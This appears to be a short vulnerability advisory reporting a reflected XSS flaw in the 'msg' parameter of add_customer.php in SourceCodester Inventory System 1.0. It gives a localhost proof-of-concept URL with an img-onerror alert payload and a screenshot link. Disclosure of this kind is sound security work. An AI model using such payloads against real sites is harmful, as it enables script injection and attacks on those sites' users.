# Reflected XSS in Inventory System (Add Customer)
...
* **Version**: 1.0
* **Component**: Add Customer (`add_customer.php`)
* **Vulnerable Parameter**: `msg` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `add_customer.php` file.
...
```
http://127.0.0.1:8089/add_customer.php?msg=%3Cimg%20src=%22x%22%20onerror=%22alert(808774)%22%3E
...
<img width="926" height="646" alt="图片" src="https://github.com/user-attachments/assets/9100fbe9-6cb1-44f8-8d0f-0891bc8db52d" />
